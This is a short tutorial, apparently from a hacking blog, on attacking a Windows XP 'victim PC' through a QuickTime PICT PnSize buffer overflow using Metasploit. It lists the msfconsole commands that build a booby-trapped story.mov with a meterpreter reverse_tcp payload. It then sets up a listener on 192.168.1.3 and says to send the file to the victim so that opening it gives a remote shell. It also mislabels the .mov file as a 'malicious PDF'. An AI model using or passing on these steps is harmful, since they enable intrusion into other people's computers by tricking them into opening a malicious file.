Attacking on Remote Victim PC using Apple QuickTime PICT PnSize Buffer Overflow

This module exploits vulnerability in Apple QuickTime Player 7.60.92.0. When opening a .mov file containing a specially crafted PnSize value, an attacker may be able to execute arbitrary code.
Apple QuickTime Player 7.6
Attacker: Backtrack 5
Victim PC: Windows XP
Open backtrack terminal type msfconsole

Now type use exploit/windows/fileformat/apple_quicktime­_pnsize
Msf exploit (apple_quicktime­_pnsize)>set payload windows/meterpreter/reverse_tcp
Msf exploit (apple_quicktime­_pnsize)>set lhost 192.168.1.3 (IP of Local Host)
Msf exploit (apple_quicktime­_pnsize)>set filename story.mov
Msf exploit (apple_quicktime­_pnsize)>exploit

After we successfully generate the malicious PDF, it will stored on your local computer
/root/.msf4/local/story.mov

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.3
exploit 
Now send your story.mov files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer.
